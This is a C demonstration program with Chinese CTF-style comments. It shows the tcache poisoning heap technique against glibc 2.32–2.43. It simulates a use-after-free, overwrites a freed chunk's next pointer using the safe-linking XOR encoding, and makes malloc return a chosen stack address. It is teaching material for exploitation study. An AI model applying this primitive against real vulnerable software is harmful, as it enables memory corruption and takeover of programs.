/*
 * 中文导读（CTF 版）
 *
 * 手法：tcache_poisoning
 * 文件标注范围：2.32 ~ 2.43
 * 模拟漏洞：UAF/重叠写，可覆盖已释放 tcache chunk 的 next。
 * 核心流程：把 next 指向目标；2.32 起必须按 PROTECT_PTR(pos, ptr) 编码，并保证目标 0x10 对齐。
 * 成功判据：第二次 malloc 返回 target。这个原语只解决任意分配，最终劫持点需按题目另选。
 *
 * 阅读约定：malloc 返回的是 user data；源码里 p[-1] 通常是 size，p[-2]
 * 是 prev_size。所有故意的 UAF、越界和 double free 都是漏洞模拟，不是正常 C 用法。
 * 版本范围以本目录 README 和验证矩阵为准；发行版回移补丁时应按实际 libc 源码判断。
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <assert.h>

int main()
{
	// 禁用标准流缓冲，避免 stdio 的隐式堆分配打乱演示所需的 chunk 顺序。
	setbuf(stdin, NULL);
	setbuf(stdout, NULL);

	size_t stack_var[0x10];
	size_t *target = NULL;

	// 从栈数组中选择一个满足 0x10 对齐的目标地址，以通过 tcache_get 的对齐检查。
	for(int i=0; i<0x10; i++) {
		if(((long)&stack_var[i] & 0xf) == 0) {
			target = &stack_var[i];
			break;
		}
	}
	assert(target != NULL);

	intptr_t *a = malloc(128);

	intptr_t *b = malloc(128);

	free(a);
	free(b);

	// 漏洞模拟开始：覆盖已释放节点 b 的 next 指针。
	// 下式需要知道 b 的堆地址才能计算 safe-linking 密文，因此实际利用必须先获得堆地址泄露。
	b[0] = (intptr_t)((long)target ^ (long)b >> 12);
	// 漏洞模拟结束：此时链表逻辑上变为 b→target。

	// 第一次分配正常取出表头 b；解码后的 target 随即成为新的 tcache 表头。
	intptr_t *first = malloc(128);
	assert(first == b);

	intptr_t *c = malloc(128);

	assert((long)target == (long)c);
	return 0;
}
